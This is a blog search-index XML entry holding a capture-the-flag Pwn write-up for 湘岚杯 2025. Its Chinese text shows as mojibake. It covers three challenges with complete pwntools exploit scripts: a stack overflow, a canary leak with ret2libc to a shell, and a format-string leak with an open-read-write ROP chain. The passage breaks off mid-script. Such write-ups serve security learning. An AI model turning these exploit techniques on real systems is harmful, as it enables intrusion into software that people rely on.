<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æ¹˜å²šæ¯ 2025</title>
    <link href="/post/2004.html"/>
    <url>/post/2004.html</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="ret2textç­¾åˆ°"><a href="#ret2textç­¾åˆ°" class="headerlink" title="ret2textç­¾åˆ°"></a>ret2textç­¾åˆ°</h2><p>ret2text</p><img src="/post/2004/1737108997002-a33ba1d7-fb58-4edc-810c-677cba7f434f.png" class="" title="img"><img src="/post/2004/1737109014977-2d2df38e-bb46-4463-81f8-8ead0324ed13.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">41658</span>)<br><br>shell = <span class="hljs-number">0x401157</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xA</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(shell)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><p>å¼€äº† Canary å’Œ NX ä¿æŠ¤</p><img src="/post/2004/1737109393365-f5eb554f-8353-439a-991c-bcfe05f8829e.png" class="" title="img"><p>bug å‡½æ•°æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥ä¹‹å printf ä¼šæ‰“å°è¾“å…¥çš„å†…å®¹</p><img src="/post/2004/1737109363183-e193bf1a-7f00-4a3a-884a-c5254af286ed.png" class="" title="img"><p>ç”±äºç¨‹åºå¼€äº† canary ä¿æŠ¤ï¼Œæ‰€ä»¥éœ€è¦æ³„éœ²å‡º canaryã€‚æˆ‘ä»¬æ³¨æ„åˆ° canary åœ¨ rbp-8 çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆè¾“å…¥ 0x30-0x8 å­—èŠ‚çš„æ•°æ®ï¼Œç„¶åå†è¾“å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œåœ¨ printf æ‰“å°æ•°æ®æ—¶ï¼Œcanary ä¹Ÿä¼šè¢«æ³„éœ²å‡ºæ¥ï¼Œæœ€ååœ¨ç¬¬äºŒæ¬¡è¾“å…¥æ—¶æ‰“ ret2libc å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">26764</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc6_2.27-3ubuntu1.6_amd64.so&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x400764</span><br>pop_rdi = <span class="hljs-number">0x400843</span><br>ret = <span class="hljs-number">0x40059e</span><br><br>p.recvuntil(<span class="hljs-string">&quot;I think it&#x27;s easy to get the flag!&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>p.recvuntil(<span class="hljs-string">&quot;Maybe UR closer to the key&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;keep trying\n&quot;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;I think it&#x27;s easy to get the flag!&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Maybe UR closer to the key&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ä½ çŸ¥é“sandboxå—ï¼Ÿ"><a href="#ä½ çŸ¥é“sandboxå—ï¼Ÿ" class="headerlink" title="ä½ çŸ¥é“sandboxå—ï¼Ÿ"></a>ä½ çŸ¥é“sandboxå—ï¼Ÿ</h2><p>è¿™é“é¢˜ä¹Ÿæ˜¯ç¦»è°±ï¼Œä¸­é€”æ¢äº†é™„ä»¶ï¼Œç„¶å libc ä¹Ÿæ²¡ç»™å¯¹ã€‚</p><img src="/post/2004/1737110334744-235090bd-5163-4f6f-b61f-2fb936e0b843.png" class="" title="img"><p>å¼€äº† Canary å’Œ NX ä¿æŠ¤</p><img src="/post/2004/1737110402466-95b777c5-898e-4fc7-9835-18e36b8cfcb4.png" class="" title="img"><p>main å‡½æ•°è°ƒç”¨äº† sandbox å‡½æ•°å’Œ func å‡½æ•°</p><img src="/post/2004/1737110613744-2ce28711-9d52-45b3-a7cb-22e5c73b33cd.png" class="" title="img"><p>func å‡½æ•°æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥çš„å¤§å°æ˜¯ 0x20ï¼Œæ²¡æœ‰æ ˆæº¢å‡ºï¼Œä½†æ¥ä¸‹æ¥çš„ printf å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼›ç¬¬äºŒæ¬¡è¾“å…¥çš„å¤§å°æ˜¯ 0x150ï¼Œå­˜åœ¨æ ˆæº¢å‡º</p><img src="/post/2004/1737110246782-167c1530-1bac-40ea-8ea9-e92072b31252.png" class="" title="img"><p>æŸ¥çœ‹æ²™ç®±å‘ç°ç¦ç”¨äº† execve</p><img src="/post/2004/1737110586791-9ee601ad-3ef5-4af3-a228-a4b4de9d2bfb.png" class="" title="img"><p>æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ³„éœ²å‡º canary å’Œ libcï¼Œgdb è°ƒè¯•ï¼Œå‘ç° canary å’Œ libc åˆ†åˆ«åœ¨ 13 å’Œ 19 çš„ä½ç½®</p><img src="/post/2004/1737111786328-46bb0046-81ec-4762-a63f-7b418477101a.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p-%19$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>p.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br></code></pre></td></tr></table></figure><p>ç”±äºå¼€äº†æ²™ç®±ï¼Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ orw æ¥å°† flag è¯»å‡ºæ¥</p><p>æˆ‘ä»¬å…ˆæ„é€  read çš„ rop é“¾ï¼Œç”¨äºåç»­å°†æ–‡ä»¶ .&#x2F;flag è¯»åˆ° bss æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#read(0, bss, 0x40)bss-&gt;&#x27;./flag&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br></code></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨ open æ‰“å¼€ bss æ®µä¸Šçš„æ–‡ä»¶.&#x2F;flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(bss, 0, 0)bss-&gt;&#x27;./flag&#x27;</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-built_in">open</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ read è¯»å–æ–‡ä»¶.&#x2F;flag çš„å†…å®¹åˆ° bss æ®µï¼Œç”±äº.&#x2F;flag æ˜¯ç¬¬ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æ–‡ä»¶æè¿°ç¬¦æ˜¯ 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br></code></pre></td></tr></table></figure><p>æœ€åéœ€è¦å°† flag æ‰“å°å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨äº† puts æ¥æ‰“å°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn1&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">48321</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401402</span><br>pop_rdi = <span class="hljs-number">0x4014c3</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p-%19$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>p.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br><span class="hljs-comment">#read(0, bss, 0x40)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-built_in">open</span>)<br><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br>p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(<span class="hljs-string">b&#x27;./flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œç”±äºå½“æ—¶ libc æ²¡ç»™å¯¹ï¼Œç»™æˆ‘åšæ€¥çœ¼äº†ï¼Œç„¶åçªç„¶æ„è¯†å…¶å®è¿™é“é¢˜å¯ä»¥æ³„éœ²å‡º puts å‡½æ•°çš„çœŸå®åœ°å€ï¼Œè¿œç¨‹ puts å‡½æ•°çš„çœŸå®åœ°å€æ˜¯ e50 ç»“å°¾ï¼Œè¿™æ­£å¥½æ˜¯æˆ‘è™šæ‹Ÿæœº Ubuntu22.04 çš„ libcã€‚</p><p>æˆ‘ä»¬å…ˆåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡º canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ¬¡è¾“å…¥æˆ‘ä»¬æ³„éœ²å‡º puts å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå†è¿”å› main å‡½æ•°ï¼Œç„¶åå°±æ˜¯åˆ©ç”¨ puts å‡½æ•°è®¡ç®— libc åŸºå€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn3&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;xlctf.huhstsec.top&quot;</span>, <span class="hljs-number">48321</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401402</span><br>pop_rdi = <span class="hljs-number">0x4014c3</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x40133F&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>p.recvuntil(<span class="hljs-string">&quot;can you did it?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Do you know orw?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%13$p&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br><span class="hljs-comment">#read(0, bss, 0x40)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read)<br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-built_in">open</span>)<br><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += 